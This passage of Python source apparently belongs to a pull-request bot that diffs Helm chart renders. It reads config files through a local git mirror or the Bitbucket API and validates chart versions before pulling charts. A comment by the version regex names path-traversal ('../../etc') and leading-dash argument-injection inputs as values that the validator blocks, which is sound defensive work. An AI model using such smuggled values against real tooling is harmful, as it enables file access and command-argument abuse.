    REASON_OCI_PULL:      "could not pull the OCI chart (registry login or network)",
    REASON_METADATA:      "app not yet in the discovery cache (added since last refresh)",
    REASON_RENDER:        "helm template failed to render the chart with these values",
    REASON_MISSING_REQUIRED: "a value the chart requires is missing from this environment's hierarchy",
    REASON_SCHEMA_INVALID: "this environment's values fail the chart's values.schema.json validation",
    REASON_NAME_TOO_LONG: "the derived GCP service account name violates a hard Google IAM limit",
    REASON_TIMEOUT:       f"a diff step exceeded {DIFF_TIMEOUT}s",
    REASON_UNEXPECTED:    "an unexpected error occurred while computing the diff",
    REASON_INVALID_VERSION: "appspace.version was rejected as unsafe/invalid — not a valid OCI tag",
    REASON_INVALID_YAML:  "a changed value file is not valid YAML — fix the YAML syntax",
    "retry_exhausted":    "still failing after retries",
    "legacy":             "diff could not be computed",
}


# Status codes returned by _bb_fetch_status alongside the content.
BB_OK        = "ok"          # file fetched
BB_NOT_FOUND = "not_found"   # 404 — file genuinely absent at this sha (cacheable)
BB_ERROR     = "error"       # transient (429/5xx/network) after retries (NOT cacheable)


# ── Local git mirrors (COPS-2564) ──────────────────────────────────────────
#
# Reading config files over the Bitbucket REST API costs one HTTPS call per
# file per sha. acme-config-prod alone has 391 value files, so a PR that
# touches a root file needs ~780 calls, and the (sha, path) cache goes cold
# every time either side moves -- which is constantly, since any merge to main
# moves the base sha for every open PR. Add three repos polled in parallel and
# 429-driven retries, and the shared token (COPS-2543) runs out.
#
# git already solves this: one fetch brings every file at every commit.
# Measured on the real prod repo: fetch 1.8s, then reading all 391 files at a
# commit with cat-file takes 0.13s.
#
# This sits BEHIND _bb_fetch_status, the seam every reader already uses, and
# returns the same (content, status) contract. Three outcomes, and the
# difference between the last two is the whole correctness argument:
#   (content, BB_OK)        file read from the mirror
#   (None, BB_NOT_FOUND)    sha IS in the mirror and the path is not in that
#                           tree -- a fact, exactly like the API's 404, safe
#                           to cache
#   None                    MISS: we cannot answer (sha unknown, git missing,
#                           mirror broken). The caller falls back to the API.
#                           Never report this as NOT_FOUND: caching that lie
#                           would render an environment as empty.
GIT_BIN            = os.environ.get("GIT_BIN", "git")
GIT_MIRROR_ENABLED = os.environ.get("GIT_MIRROR_ENABLED", "1") not in ("0", "false", "False")
# Under /tmp because the container runs with readOnlyRootFilesystem and /tmp
# is the emptyDir the chart already mounts.
GIT_MIRROR_DIR     = os.environ.get("GIT_MIRROR_DIR", "/tmp/config-mirrors")
GIT_MIRROR_TIMEOUT = _env_int("GIT_MIRROR_TIMEOUT", 180)
# git over HTTPS does NOT accept the same credential shape as the REST API.
# Verified live (2026-07-30): Basic auth with the account email and the
# Atlassian API token works for api.bitbucket.org and is rejected by
# bitbucket.org git, which then asks for a username and, with prompts
# disabled, fails with "could not read Username". Bitbucket expects the fixed
# username "x-bitbucket-api-token-auth" with an API token. Overridable,
# because a classic app password wants the real Bitbucket username instead.
GIT_HTTP_USER      = os.environ.get("GIT_HTTP_USER", "x-bitbucket-api-token-auth")


def _git_auth_header(user: str = None) -> str:
    return "Basic " + _base64.b64encode(
        f"{user or GIT_HTTP_USER}:{BB_TOKEN}".encode()).decode()


# The two credential shapes Bitbucket accepts over git HTTPS, tried in order:
# an Atlassian API token (the fixed token-auth username, what this pod has
# today) and a classic app password (the account's own username). Trying both
# costs one extra call once per pod, and without it a credential swap would
# silently send every read back to the REST API forever, which is exactly the
# problem this feature exists to remove.
_GIT_USER_CANDIDATES = [GIT_HTTP_USER, BB_USER]
_GIT_AUTH_HEADER   = _git_auth_header()

_mirror_lock       = threading.Lock()      # serialises clone/fetch per repo
_mirror_ready      = {}                    # repo -> True once cloned
_mirror_sha_seen   = {}                    # (repo, sha) -> bool, presence cache
_mirror_disabled   = False                 # set after a hard failure
_git_credential_resolved = False           # probe runs once per pod


def _mirror_state_reset():
    """Forget clone/presence state. Used by tests and after a hard failure."""
    global _mirror_disabled, _git_credential_resolved
    with _mirror_lock:
        _mirror_ready.clear()
        _mirror_sha_seen.clear()
        _mirror_disabled = False
        _git_credential_resolved = False


def _git_env(auth_header: str = None) -> dict:
    """Environment for every git call.

    The Bitbucket credential travels as an http.extraHeader supplied through
    GIT_CONFIG_* env vars, never on the command line: argv is visible in the
    process list and gets echoed back in error messages. HOME is inherited as-is:
    the chart already sets HOME=/tmp for argocd's own config, which is the same
    writable emptyDir the mirrors live under, so git's config has somewhere to
    go without this needing its own override.
    """
    env = dict(os.environ)
    env.update({
        "GIT_TERMINAL_PROMPT": "0",       # never block waiting for a password
        "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_CONFIG_COUNT": "1",
        "GIT_CONFIG_KEY_0": "http.extraHeader",
        "GIT_CONFIG_VALUE_0": f"Authorization: {auth_header or _GIT_AUTH_HEADER}",
    })
    return env


def _git_run(args, cwd=None, timeout=None, auth_header=None):
    """Run git and return the CompletedProcess, or None if it could not run."""
    try:
        return subprocess.run([GIT_BIN, *args], cwd=cwd, capture_output=True,
                              text=True, env=_git_env(auth_header),
                              timeout=timeout or GIT_MIRROR_TIMEOUT)
    except Exception as e:
        debug(f"[mirror] git {' '.join(args[:2])} failed to run: {e}")
        return None


def _resolve_git_credential(probe_url: str):
    """Pick the credential shape that this Bitbucket account actually accepts.

    Done once per pod with `git ls-remote`, which is cheap and, unlike a
    clone, fails fast. Auth failures over git HTTPS surface as "could not read
    Username" rather than a clear 401, so probing here turns a silent
    permanent fallback into one clear log line at startup.
    """
    global _GIT_AUTH_HEADER, _git_credential_resolved
    if _git_credential_resolved:
        return
    for user in _GIT_USER_CANDIDATES:
        if not user:
            continue
        header = _git_auth_header(user)
        r = _git_run(["ls-remote", "--quiet", probe_url, "HEAD"],
                     timeout=60, auth_header=header)
        if r is not None and r.returncode == 0:
            _GIT_AUTH_HEADER = header
            _git_credential_resolved = True
            log(f"[mirror] git credential accepted for user {user!r}")
            return
    log("[mirror] no git credential shape was accepted -- every read will "
        "fall back to the Bitbucket API", "WARNING")
    _git_credential_resolved = True


def _mirror_path(repo: str) -> str:
    return os.path.join(GIT_MIRROR_DIR, f"{repo}.git")


def mirror_sync(repo: str):
    """Clone the mirror once, then fetch it. Called once per repo per
    iteration. Never raises: a mirror problem must slow nothing down except
    the mirror itself, with the API still serving every read."""
    if not GIT_MIRROR_ENABLED or _mirror_disabled:
        return
    path = _mirror_path(repo)
    with _mirror_lock:
        try:
            os.makedirs(GIT_MIRROR_DIR, exist_ok=True)
        except Exception as e:
            log(f"[mirror] cannot create {GIT_MIRROR_DIR}: {e} -- "
                f"falling back to the Bitbucket API", "WARNING")
            return
        t0 = time.monotonic()
        if not os.path.isdir(os.path.join(path, "objects")):
            url = f"https://bitbucket.org/{BB_WORKSPACE}/{repo}.git"
            _resolve_git_credential(url)
            r = _git_run(["clone", "--mirror", "--quiet", url, path])
            if r is None or r.returncode != 0:
                detail = (r.stderr or "")[:200] if r else "git not runnable"
                log(f"[mirror] clone of {repo} failed: {detail} -- "
                    f"falling back to the Bitbucket API", "WARNING")
                _mirror_ready[repo] = False
                return
            _mirror_ready[repo] = True
            log(f"[mirror] cloned {repo} in {time.monotonic() - t0:.1f}s")
        r = _git_run(["--git-dir", path, "fetch", "--prune", "--quiet", "origin"])
        if r is None or r.returncode != 0:
            detail = (r.stderr or "")[:200] if r else "git not runnable"
            log(f"[mirror] fetch of {repo} failed: {detail} -- serving what "
                f"the mirror already has, API covers the rest", "WARNING")
            return
        _mirror_ready[repo] = True
        # Shas that were absent may exist now, so the presence cache for this
        # repo has to go. Keeping it would pin a miss for the whole pod life.
        for k in [k for k in _mirror_sha_seen if k[0] == repo]:
            _mirror_sha_seen.pop(k, None)
        debug(f"[mirror] {repo} fetched in {time.monotonic() - t0:.1f}s")


def _mirror_has_sha(repo: str, sha: str) -> bool:
    """Is this commit in the mirror? Cached per (repo, sha): without it every
    file read pays a second subprocess, doubling the cost of the thing this
    is meant to make cheap."""
    key = (repo, sha)
    with _mirror_lock:
        if key in _mirror_sha_seen:
            return _mirror_sha_seen[key]
    r = _git_run(["--git-dir", _mirror_path(repo), "cat-file", "-e",
                  f"{sha}^{{commit}}"], timeout=30)
    ok = bool(r) and r.returncode == 0
    with _mirror_lock:
        _mirror_sha_seen[key] = ok
    return ok


def _git_read_file(repo: str, sha: str, filepath: str):
    """Read one file at one commit from the mirror.

    Returns (content, BB_OK), (None, BB_NOT_FOUND), or None for a miss.
    """
    if not GIT_MIRROR_ENABLED or _mirror_disabled or not repo or not sha:
        return None
    path = _mirror_path(repo)
    if not os.path.isdir(os.path.join(path, "objects")):
        return None
    if not _mirror_has_sha(repo, sha):
        return None
    # Same normalisation as _bb_fetch_cached, so both readers agree on what
    # the same file is.
    clean = posixpath.normpath(str(filepath).replace("$config/", "").lstrip("/"))
    r = _git_run(["--git-dir", path, "cat-file", "blob", f"{sha}:{clean}"],
                 timeout=30)
    if r is None:
        return None
    if r.returncode != 0:
        # The commit is present, so "not in this tree" is a fact, the same
        # answer the API gives with a 404.
        return None, BB_NOT_FOUND
    _count_bb_call("mirror_reads")
    return r.stdout, BB_OK


def _bb_fetch_status(filepath, sha, repo=None):
    """Fetch a raw file from a config repo at a commit SHA.

    Returns (content_or_None, status) where status is one of BB_OK / BB_NOT_FOUND
    / BB_ERROR. The distinction matters for caching: a genuine 404 is a stable
    fact and may be cached, but a transient error must NOT be cached as "missing"
    or it would poison every app that shares the same (sha, path) key.
    Multi-repo note (COPS-2507): callers pass the PR's repo; the (sha, path)
    cache key stays collision-free WITHOUT the repo because git commit SHAs
    are globally unique across repositories.

    Uses a direct call instead of bb()/http() because those helpers always
    json.loads() the response, which fails for YAML/text files.
    v2.5.20 (E1): pooled — this is the single hottest HTTP path on a
    mass PR (one call per value file), so it gains the most from
    connection reuse.
    """
    _repo = repo or _repo_for_sha(sha) or BB_REPO
    # COPS-2564: the local mirror answers first. A miss (None) means it cannot
    # answer, not that the file is absent, so the API call below still runs.
    _hit = _git_read_file(_repo, sha, filepath)
    if _hit is not None:
        return _hit
    url = (f"https://api.bitbucket.org/2.0/repositories/"
           f"{BB_WORKSPACE}/{_repo}/src/{sha}/{filepath}")
    # COPS-2550: this bypasses http() on purpose (JSON parsing there breaks
    # YAML/text content), so it must set its own User-Agent explicitly.
    # header_items() (used by _pooled_urlopen) only carries headers set
    # explicitly on the Request -- urlopen's IMPLICIT default is not one of
    # them -- so a request built with only Authorization went out with none
    # at all. Confirmed against a real Bitbucket support export: this was
    # 6255 of 9270 requests (67%) in the incident, all logged as
    # "Amazon CloudFront" (Bitbucket's front end stamps that on any request
    # that arrives with no User-Agent), which is why our own traffic was
    # first misread as an unrelated AWS service.
    req = urllib.request.Request(url, headers={
        "Authorization": _BB_AUTH_HEADER,
        "User-Agent": _user_agent(),
    })
    for attempt in range(3):
        # v2.13.0 (COPS-2543): brake with the whole pool before spending an
        # attempt, so a 429 another thread already hit does not cost this one
        # a retry. Outside the semaphore: a thread that is only waiting must
        # not sit on one of the BB_API_CONCURRENCY slots.
        _bb_ratelimit_wait()
        # COPS-2564: counted here, per ATTEMPT, because a retry is a real
        # extra call against the shared token. A cache hit never reaches
        # this function, so the number stays "calls we made to Bitbucket".
        _count_bb_call("file_fetches")
        try:
            with _bb_api_sem:   # global rate limiter: caps concurrent BB API calls
                with _pooled_urlopen(req, timeout=20) as r:
                    return r.read().decode("utf-8", errors="replace"), BB_OK
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return None, BB_NOT_FOUND   # genuinely absent at this sha
            if e.code in (429, 500, 502, 503, 504) and attempt < 2:
                if e.code == 429:
                    _count_bb_call("rate_limited")
                    # Honor the server-mandated pause, same as http() has done
                    # since v2.5.19 (M5) — this path was the one that never
                    # learned it, and 2s against a ~60s window meant both
                    # retries died inside the same rejected window.
                    ra = _parse_retry_after((e.headers or {}).get("Retry-After"))
                    wait = min(ra, BB_RATELIMIT_MAX_PAUSE) if ra is not None \
                        else BB_RATELIMIT_FALLBACK
                    # WARNING, not debug(): rate limiting is an operational
                    # signal. Production only ever showed the aggregate error.
                    log(f"[bb] 429 rate limited on {filepath} — pausing all "
                        f"Bitbucket calls {wait}s (retry {attempt+1}/2)", "WARNING")
                    _bb_ratelimit_hold(wait)
                    continue   # the gate above does the sleeping, for everyone
                wait = (attempt + 1) * 2  # 2s, 4s — one sick request, not a budget
                debug(f"Bitbucket API {e.code} for {filepath}, retry {attempt+1}/2 in {wait}s")
                time.sleep(wait)
                continue
            return None, BB_ERROR   # other / exhausted HTTP error — transient
        except Exception:
            if attempt < 2:
                time.sleep((attempt + 1) * 2)
                continue
            return None, BB_ERROR   # network/timeout after retries — transient
    return None, BB_ERROR   # pragma: no cover - unreachable: attempt 2 of
    # range(3) always explicitly returns above (attempt < 2 is False there),
    # so the loop never falls through naturally; defensive guard only.


_appspace_key_re      = re.compile(r"^\s*appspace:\s*(#.*)?$")
_version_key_re       = re.compile(r"^\s*version:\s*([^\s#]+)")
_customer_name_key_re = re.compile(r"^\s*customerName:\s*([^\s#]+)")
_suffix_key_re        = re.compile(r"^\s*suffix:\s*([^\s#]+)")

# A chart targetRevision is an OCI tag / semver-ish string. It flows from a
# PR-authored config file into `helm pull --version <v>` and into
# os.path.join(cache, registry, chart, <v>). Anyone who can open a PR against
# acme-config-dev controls this value, so it must be strictly validated before
# use: reject anything that is not a safe tag. This blocks both path traversal
# (../../etc) and argument injection (--foo, leading dash) at the source.
# OCI tags allow [A-Za-z0-9._-], max 128 chars, and must not start with a dash.
# A safe OCI tag: alphanumeric start, then alphanumerics and . _ - + (build
# metadata like 1.0.0+abc is legal in OCI tags and semver, v2.5.0 H5). Still
# forbids path separators, whitespace, leading dash, and shell metacharacters.
# \Z, not $: in Python re, `$` also matches just BEFORE a trailing
# newline, so "1.2.3\n" slipped through while the contract below promises
# no whitespace at all. \Z anchors to the true end of the string.
# (Caught by tests/test_property_based.py's spec-equivalence property.)
_SAFE_CHART_VERSION_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]{0,127}\Z")


def _is_valid_chart_version(version: str) -> bool:
    """True only for a safe OCI tag: no path separators, no leading dash,
    no shell/whitespace metacharacters. See _SAFE_CHART_VERSION_RE."""
    return bool(version) and bool(_SAFE_CHART_VERSION_RE.match(version))



def _extract_chart_version_checked(content: str):
    """Return (version, status) for a config file's `appspace.version`.

    status is one of:
      "ok"      — a safe appspace.version was found; version is the string.
      "none"    — there is no appspace.version direct child (no chart bump);
                  version is None.
      "invalid" — an appspace.version WAS present but was rejected as unsafe
                  (path traversal, leading dash, whitespace/shell metachars);
                  version is None.

    The distinction matters: "none" means the PR did not touch the chart
    revision, while "invalid" means the author DID set a version and it was
    rejected. Collapsing both into None (the old behaviour) made a rejected
    version look identical to "no bump" and produced a green "no changes"
    comment that hid the rejection from reviewers (FIX A, v2.4.9).

    The ApplicationSet sets spec.sources[1].targetRevision = appspace.version, so
    the only value we want is the `version:` that is a DIRECT child of the
    top-level `appspace:` mapping. A plain regex for the first `version:` is
    unsafe: config files carry other, deeper `version:` keys (e.g.
    appspace.elastic.version: 8.15.1) that must never be mistaken for the chart
    revision. We track indentation so only the direct child matches.

    IMPORTANT (v2.5.3 CRIT-1): a duplicate `version:` key at the direct-child
    level must resolve to the LAST occurrence, matching real YAML/Helm
    semantics (confirmed empirically against `helm template`: last key wins).
    The scan below used to return on the FIRST match, which let a duplicated
    key mask a real chart bump — confirmed live in production on PR #6637,
    where the bot rendered the OLD chart and reported a harmless-looking tag
    downgrade instead of the real full-service undeploy the merge would
    actually cause. We now scan the whole file and keep the last match.
    """
    in_appspace     = False
    appspace_indent = -1
    child_indent    = None
    last_candidate  = None  # raw (quote-stripped) value of the LAST direct-
                             # child version: line seen, across the whole file.
    for line in content.splitlines():
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        indent = len(line) - len(line.lstrip())
        # A line at or above the appspace indent closes the block.
        if in_appspace and indent <= appspace_indent:
            in_appspace  = False
            child_indent = None
        if _appspace_key_re.match(line):
            in_appspace     = True
            appspace_indent = indent
            child_indent    = None
            continue
        if in_appspace:
            # The first key deeper than appspace defines the direct-child indent.
            if child_indent is None and indent > appspace_indent:
                child_indent = indent
            vm = _version_key_re.match(line)
            if vm and indent == child_indent:
                # Do not return yet -- a later duplicate key on a subsequent
                # line must overwrite this one (last-key-wins).
                last_candidate = vm.group(1).strip("'\"")
    if last_candidate is None:
        return None, "none"
    # Reject anything that is not a safe OCI tag. A PR author controls this
    # value and it reaches `helm pull --version` and a filesystem path, so an
    # unsafe value is treated as "no version bump" rather than passed
    # downstream. This applies to the LAST occurrence: if it is unsafe we
    # must not silently fall back to an earlier, safe-looking duplicate --
    # that would just relocate the false-green bug instead of fixing it.
    if not _is_valid_chart_version(last_candidate):
        log(f"_extract_chart_version: rejecting unsafe version "
            f"{last_candidate!r} (not a valid OCI tag)", "WARNING")
        return None, "invalid"
    return last_candidate, "ok"


def _extract_chart_version(content: str):
    """Backward-compatible wrapper: returns the version string or None.

    Existing callers that only care about the value (new-env render path)
    keep working unchanged. Callers that must react to a rejected version
    use _extract_chart_version_checked directly.
    """
    version, _status = _extract_chart_version_checked(content)
    return version


def _extract_appspace_identity(content: str) -> tuple:
    """Return (customer_name, suffix) as declared directly under the
    top-level `appspace:` mapping in a customer.yaml/config.yaml file.

    v2.5.15 (Finding 7). Mirrors _extract_chart_version_checked's
    direct-child-of-appspace tracking (last-key-wins on a duplicate key),
    applied to customerName and suffix instead of version.

    customerName is the true identity of an environment (drives the
    namespace and related wiring). suffix is the variant (a/b/c...); it can
    be declared locally in this file OR inherited from a parent config.yaml
    higher in the tier. instanceName is NOT read here -- it names virtual
    machines only and is not an environment identity signal.

    Either element of the returned tuple is None when not declared in THIS
    file. A None suffix does not mean "no suffix", only "not declared here"
    -- a caller that needs the chain-resolved effective value must fetch and
    check ancestor config.yaml files separately; this function only reads
    what one specific file states.
    """
    in_appspace     = False
    appspace_indent = -1
    child_indent    = None
    customer_name = None
    suffix        = None
    for line in (content or "").splitlines():
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        indent = len(line) - len(line.lstrip())
        if in_appspace and indent <= appspace_indent:
            in_appspace  = False
            child_indent = None
        if _appspace_key_re.match(line):
            in_appspace     = True
            appspace_indent = indent
            child_indent    = None
            continue
        if in_appspace:
            if child_indent is None and indent > appspace_indent:
                child_indent = indent
            if indent == child_indent:
                cm = _customer_name_key_re.match(line)
                if cm:
                    customer_name = cm.group(1).strip("'\"")
                sm = _suffix_key_re.match(line)
                if sm:
                    suffix = sm.group(1).strip("'\"")
    return customer_name, suffix


# ── Helm-template local diff ─────────────────────────────────────────────────
# Credentials and config read from environment (added to pod via ExternalSecret).
HELM_BIN        = os.environ.get("HELM_BIN", "/usr/local/bin/helm")
OCI_USER        = os.environ.get("OCI_USER", "acme-repo")
OCI_PASS        = os.environ.get("OCI_PASS", "")
HELM_CACHE_DIR  = os.environ.get("HELM_CACHE_DIR", "/tmp/acme-helm-cache")
# Pin the Kubernetes version helm renders against so charts that branch on
# .Capabilities.KubeVersion produce stable, cluster-representative output. Both
# the main and PR renders use the same value, so the diff stays consistent.
# COPS-2565: verified 2026-07-31 that every GKE cluster in appspace-cloud and
# appspace-devops runs 1.35.x, so rendering against 1.30.0 was five minors
# behind. One constant is enough precisely because they all share a version,
# and because no chart branches on Helm .Capabilities today (guarded by a test).
# If either of those stops being true, this needs to become per-cluster.
KUBE_VERSION    = os.environ.get("KUBE_VERSION", "1.35.5")

# Dev OCI registries may republish charts with the same tag (CI fast-loop). Cache
# dev-registry chart versions for at most this many seconds before re-pulling.
# Release registry charts are immutable, so we skip the TTL check for them.
DEV_CHART_TTL        = _env_int("DEV_CHART_TTL", 600)   # 10 min default
_DEV_REGISTRY_PATTERN = "helm-oci-dev."           # hostname prefix identifying dev registries
# Timestamp of each cached chart version's last pull, for dev-TTL eviction.
_helm_chart_pull_ts: dict = {}   # key -> monotonic time of last successful pull

# Registries that have been successfully authenticated this pod lifetime.
_helm_logged_in: set = set()
_helm_login_lock     = threading.Lock()
# Timestamp of the last successful login per registry. Re-login after this many
# seconds so a secret rotation (new OCI_PASS) is picked up without a pod restart.
HELM_LOGIN_TTL       = _env_int("HELM_LOGIN_TTL", 6 * 3600)  # 6h default
_helm_login_ts: dict = {}   # registry -> monotonic timestamp of last successful login
# Local chart path cache: "{registry}/{chart}:{version}" -> "/tmp/.../chart_dir"
_helm_chart_cache: dict = {}
_helm_cache_lock        = threading.Lock()
# Per-chart-version pull locks: prevent multiple threads pulling the same chart at once.
# Without this, concurrent diffs trigger parallel helm pulls to the same directory,
# causing "failed to untar: a file or directory already exists" errors.
_helm_pull_locks: dict  = {}
_helm_pull_locks_lock   = threading.Lock()

# ── Shared thread pool for sub-tasks inside _run_one_diff (#6) ───────────────
# Creating/destroying a ThreadPoolExecutor per diff call (3× per call) causes
# hundreds of thread spawns per PR. A module-level pool is cheaper: workers are
# reused and the pool lives for the pod lifetime.
# Size: enough for concurrent (pull PR + pull main + fetch PR vf + fetch main vf
# + render PR + render main) across DIFF_WORKERS parallel diffs.
_SUBTASK_POOL_WORKERS = max(8, DIFF_WORKERS * 2)  # default 32
_subtask_pool: ThreadPoolExecutor = None           # created lazily in main()

def _get_subtask_pool() -> ThreadPoolExecutor:
    """Return (or create) the module-level sub-task pool."""
    global _subtask_pool
    if _subtask_pool is None:
        _subtask_pool = ThreadPoolExecutor(
            max_workers=_SUBTASK_POOL_WORKERS,
            thread_name_prefix="diff-subtask")
    return _subtask_pool

# ── Singleflight for value-file fetches (#1) ─────────────────────────────────
# Prevents N concurrent diffs from all fetching the same (sha, path) when the
# cache is cold (the common case at the start of a PR burst).
# Pattern: first thread to miss cache creates an Event; others wait on it.
_vf_inflight: dict = {}
_vf_inflight_lock   = threading.Lock()

# ── Main-side render cache (#3) ───────────────────────────────────────────────
# The main-sha render of an app is identical for every diff that runs within the
# same loop iteration (same base_sha). Cache the parsed resource dict so
# concurrent and sequential diffs on the same app skip re-fetching + re-rendering.
# Key: (app, main_sha)   Value: dict of parsed manifest resources
# Cleared when the base_sha changes (detected in main_iteration).
_main_render_cache: dict = {}
_main_render_lock        = threading.Lock()
_main_render_sha: dict   = {}   # per-repo: {repo: main_sha} the cache is valid for (COPS-2507)
# Cap to prevent memory pressure during long-lived pods with many apps.
# Each entry holds parsed YAML dicts per resource — can be several hundred KB
# for a large micro-services chart. 200 entries ≈ a few hundred MB worst case.
MAIN_RENDER_CACHE_MAX = _env_int("MAIN_RENDER_CACHE_MAX", 200)


class OciChartNotFound(Exception):
    """Raised when an OCI chart version does not exist in the registry."""


# ── OCI self-check + failure escalation (v2.5.25) ───────────────────
# Post-incident L1/L2: during the 403 outage the pod stayed Ready and only
# ever logged WARNING while 100% of its core function was broken. Two
# complementary signals fix that blind spot:
#   1. Escalation — consecutive SYSTEMIC pull failures (auth/network, not
#      404s of nonexistent versions) log at ERROR past a threshold, so
#      log-based alerting can fire.
#   2. Self-check — a cheap `helm show chart` against a known-good ref,
#      run periodically with the SAME env contract as real pulls (cache
#      homes isolated, config home inherited), surfaced in /stats and
#      logged at ERROR on failure. Reference: DIFF_OCI_SELFCHECK_REF
#      ("registry/chart:version") if set, else the last successful pull.
OCI_FAIL_ERROR_THRESHOLD = int(os.environ.get("DIFF_OCI_FAIL_ERROR_THRESHOLD", "3"))
OCI_SELFCHECK_INTERVAL   = int(os.environ.get("DIFF_OCI_SELFCHECK_INTERVAL", "900"))

_last_pull_ok_ref = None          # (registry, chart, version) of last success
_oci_health_lock = threading.Lock()


def _record_pull_success(registry: str, chart: str, version: str):
    global _last_pull_ok_ref
    with _oci_health_lock:
        _last_pull_ok_ref = (registry, chart, version)
        _diff_stats["oci_consecutive_pull_failures"] = 0


def _record_pull_failure(ref: str) -> str:
    """Count a systemic pull failure and return the severity to log at:
    WARNING below the threshold, ERROR from the threshold on."""
    with _oci_health_lock:
        _diff_stats["oci_consecutive_pull_failures"] += 1
        n = _diff_stats["oci_consecutive_pull_failures"]
    return "ERROR" if n >= OCI_FAIL_ERROR_THRESHOLD else "WARNING"


def _oci_selfcheck():
    """Verify the authenticated OCI-pull path with a metadata-only
    `helm show chart`. Returns True/False, or None when skipped (no
    reference known yet). Never raises."""
    ref_env = os.environ.get("DIFF_OCI_SELFCHECK_REF", "").strip()
    if ref_env and "/" in ref_env and ":" in ref_env:
        reg, rest = ref_env.split("/", 1)
        chart, version = rest.rsplit(":", 1)
    elif _last_pull_ok_ref:
        reg, chart, version = _last_pull_ok_ref
    else:
        _diff_stats["oci_selfcheck"] = "skipped"
        _diff_stats["oci_selfcheck_at"] = datetime.now(timezone.utc).isoformat()
        return None
    ok = False
    detail = ""
    try:
        import tempfile
        _home = tempfile.mkdtemp(prefix=".oci-selfcheck-")
        env = dict(os.environ)
        env.update(   # same contract as real pulls: config home INHERITED
            HELM_REPOSITORY_CACHE=os.path.join(_home, "repository"),
            HELM_CACHE_HOME=os.path.join(_home, "cache"),
            HELM_DATA_HOME=os.path.join(_home, "data"),
        )
        try:
            if not _helm_login(reg):
                detail = "helm registry login failed"
            else:
                r = subprocess.run(
                    [HELM_BIN, "show", "chart", f"oci://{reg}/{chart}",
                     "--version", version],
                    capture_output=True, text=True, timeout=60, env=env)
                ok = r.returncode == 0
                if not ok:
                    detail = (r.stderr or r.stdout or "")[:200]
        finally:
            shutil.rmtree(_home, ignore_errors=True)
    except Exception as exc:
        detail = f"{type(exc).__name__}: {exc}"[:200]
        ok = False
    _diff_stats["oci_selfcheck"] = "ok" if ok else "failed"
    _diff_stats["oci_selfcheck_at"] = datetime.now(timezone.utc).isoformat()
    if ok:
        log(f"OCI self-check OK ({chart}:{version})", "DEBUG")
    else:
        log(f"OCI self-check FAILED for {chart}:{version} — the diff engine "
            f"cannot pull charts. {detail}", "ERROR")
    return ok


def _start_oci_selfcheck_loop():
    """Daemon loop: first check ~60s after startup (catches deploy
    regressions like the 403 incident within a minute), then every
    OCI_SELFCHECK_INTERVAL seconds. Disabled with interval <= 0."""
    if OCI_SELFCHECK_INTERVAL <= 0:
        return
    def _loop():
        time.sleep(60)
        while not _shutdown:
            try:
                _oci_selfcheck()
            except Exception:
                pass
            for _ in range(max(OCI_SELFCHECK_INTERVAL, 30)):
                if _shutdown:
                    return
                time.sleep(1)
    t = threading.Thread(target=_loop, daemon=True, name="oci-selfcheck")
    t.start()


def _helm_login(registry: str) -> bool:
    """Login to an OCI registry. Re-logs after HELM_LOGIN_TTL so a credential
    rotation (new OCI_PASS in the pod's secret) is picked up without a restart.
    Thread-safe — only one login per registry runs at a time."""
    with _helm_login_lock:
        ts = _helm_login_ts.get(registry, 0)
        if registry in _helm_logged_in and (time.monotonic() - ts) < HELM_LOGIN_TTL:
            return True
        if not OCI_PASS:
            return False
        r = subprocess.run(
            [HELM_BIN, "registry", "login", registry,
             "--username", OCI_USER, "--password-stdin"],
            input=OCI_PASS, capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            _helm_logged_in.add(registry)
            _helm_login_ts[registry] = time.monotonic()
            log(f"Helm OCI login OK: {registry}")
            return True
        # Login failure: clear the cached state so the next call retries.
        _helm_logged_in.discard(registry)
        log(f"Helm OCI login failed for {registry}: {r.stderr[:200]}"
            + ("..." if len(r.stderr) > 200 else ""), "WARNING")
        return False


def _ensure_chart(registry: str, chart: str, version: str) -> str:
    """Pull an OCI chart to the local cache and return the extracted chart directory.

    Raises OciChartNotFound if the version does not exist in the registry.
    Returns None on other pull failures (network, auth).
    """
    # Defense in depth: never build a filesystem path or a `helm pull
    # --version` argument from an unvalidated tag, regardless of caller.
    # _extract_chart_version already filters PR input, but this guarantees
    # the invariant at the single choke point every pull goes through.
    if not _is_valid_chart_version(version):
        log(f"_ensure_chart: refusing unsafe chart version {version!r}", "ERROR")
        return None
    if "/" in chart or ".." in chart:
        log(f"_ensure_chart: refusing unsafe chart name {chart!r}", "ERROR")
        return None
    key = f"{registry}/{chart}:{version}"
    # Dev registries can republish charts under the same tag. Treat any cached
    # copy (memory or disk) as stale after DEV_CHART_TTL seconds and re-pull.
    _is_dev = _DEV_REGISTRY_PATTERN in registry
    _now = time.monotonic()
    with _helm_cache_lock:
        if key in _helm_chart_cache:
            pull_ts = _helm_chart_pull_ts.get(key)
            if (not _is_dev) or (pull_ts is not None and _now - pull_ts < DEV_CHART_TTL):
                return _helm_chart_cache[key]
            # Dev chart in memory is past its TTL: evict and fall through so
            # the pull section below fetches the current build of this tag.
            debug(f"Dev chart memory cache stale ({version} in {registry}) — evicting")
            _helm_chart_cache.pop(key, None)

    chart_dir = os.path.join(HELM_CACHE_DIR, registry, chart, version)
    if os.path.isdir(chart_dir) and os.listdir(chart_dir):
        pull_ts = _helm_chart_pull_ts.get(key)
        is_fresh = (not _is_dev) or (pull_ts is not None and _now - pull_ts < DEV_CHART_TTL)
        if is_fresh:
            path = _find_chart_subdir(chart_dir)
            with _helm_cache_lock:
                _helm_chart_cache[key] = path
            return path
        # Dev chart is stale — evict from memory cache so next caller re-pulls.
        # Do NOT rmtree here: in-flight helm template calls hold a path reference
        # into chart_dir and could fail mid-read if we delete it from under them.
        # _prune_helm_cache() runs at iteration START before any diffs and is the
        # safe cleanup point (no active readers at that time).
        debug(f"Dev chart cache stale ({version} in {registry}) — "
              f"evicting from cache; dir removed on next _prune_helm_cache")
        with _helm_cache_lock:
            _helm_chart_cache.pop(key, None)
        with _helm_pull_locks_lock:
            _helm_pull_locks.pop(key, None)
        # Fall through to re-pull into a fresh tmp dir (atomic rename below).

    if not _helm_login(registry):
        sev = _record_pull_failure(f"{registry} (login)")
        if sev == "ERROR":
            log(f"helm registry login persistently failing for {registry} — "
                f"diff engine degraded", "ERROR")
        return None

    # Acquire a per-chart-version lock so concurrent diff threads don't all try
